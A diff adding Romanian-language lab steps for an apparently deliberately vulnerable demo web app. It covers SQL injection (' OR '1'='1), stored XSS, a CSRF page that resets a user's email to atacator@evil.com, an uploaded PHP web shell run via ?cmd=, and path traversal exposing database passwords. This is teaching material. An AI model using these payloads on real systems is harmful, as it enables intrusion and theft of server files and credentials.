@@ -1,0 +1,31 @@
+  SQL Injection
+   2. În câmpul de căutare scrie: ' OR '1'='1
+
+  B. Cross-Site Scripting (XSS)
+   1. Mergi la XSS Demo.
+   2. În câmpul de "Comentariu" scrie: <script>alert('Salut, XSS!')</script>
+   3. Rezultat: De fiecare dată când pagina se încarcă, va apărea popup-ul cu mesajul tău.
+
+  C. Cross-Site Request Forgery (CSRF)
+   1. Autentifică-te pe site cu orice user (ex: user2 / password).
+   2. Mergi la CSRF Demo.
+   3. Deschide într-un tab nou fișierul de atac: php/vulnerabilities/csrf_attack.html.
+   4. Apasă butonul "REVENDICA PREMIUL".
+   5. Rezultat: Email-ul utilizatorului tău s-a schimbat automat în atacator@evil.com fără ca
+      tu să fi completat formularul oficial.
+
+  D. Unrestricted File Upload
+   1. Mergi la File Upload Demo.
+   2. Creează un fișier pe desktop numit test.php cu acest conținut: <?php echo "Server
+      compromis!"; system($_GET['cmd']); ?>
+   3. Încarcă fișierul în pagină.
+   4. Apasă pe link-ul fișierului încărcat.
+   5. Rezultat: Browser-ul va rula codul PHP. Poți adăuga ?cmd=ls în URL pentru a vedea
+      fișierele de pe server.
+
+  E. Path Traversal
+   1. Mergi la Path Traversal Demo.
+   2. Apasă pe link-ul "Citeste config.php".
+   3. Rezultat: Vei vedea codul sursă al fișierului de configurare, inclusiv parolele bazei de
+      date (lucru care ar trebui să fie secret).
+
